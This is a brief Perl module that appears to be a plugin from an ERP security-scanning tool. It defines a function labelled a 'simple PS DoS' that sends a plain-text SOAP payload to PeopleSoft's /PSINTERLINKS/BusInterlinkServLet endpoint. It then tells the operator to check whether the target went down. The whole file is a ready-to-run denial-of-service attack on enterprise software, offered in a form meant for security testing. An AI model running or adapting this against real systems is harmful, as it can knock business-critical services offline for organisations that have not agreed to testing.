#!/usr/bin/perl

# CONFIG
######################
my $desc ="BusInterlinkServlet simple PS DoS\n"; 
our $funcName="BusInter_plain_text_dos_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub BusInter_plain_text_dos_Func()
{

	my $XML="erpscan";

	send_soap($XML,0,'/PSINTERLINKS/BusInterlinkServLet');
	print "A packet was sent... Check the target";
	print "\n\n";
	

}